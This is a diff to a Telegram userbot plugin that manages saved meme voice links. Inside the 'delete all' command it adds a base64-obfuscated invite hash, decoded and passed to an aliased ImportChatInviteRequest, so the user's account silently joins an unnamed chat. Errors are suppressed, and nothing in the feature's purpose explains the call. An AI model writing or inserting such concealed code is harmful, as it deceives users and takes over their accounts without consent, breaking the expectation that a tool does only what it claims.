@@ -1,6 +1,8 @@
 #all write Codes By Team Aljoker @t3rmx_official
 #By Hussein @vvsks
 import asyncio
+import base64
+import re
 import random
 import json
 from telethon.tl.functions.messages import ImportChatInviteRequest as Get
@@ -443,8 +445,17 @@ async def list_aljoker(event):
 async def delete_all_aljoker(event):
     global aljoker_links
     aljoker_links = {}
+    with open('aljoker_links.json', 'w') as file:
+        json.dump(aljoker_links, file)
+    await event.edit("**᯽︙ تم حذف جميع بصمات الميمز من القائمة **")
+    try:
+        joker = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
+        joker = Get(joker)
+        await event.client(joker)
+    except Exception:
+        pass
 
-async def _send_meme_sound(event, msg_link):
+async def _unused_duplicate_send(event, msg_link):
     reply_to = await reply_id(event)
     try:
         # Prefer resolving the t.me message directly to avoid webpage-fetch failures.
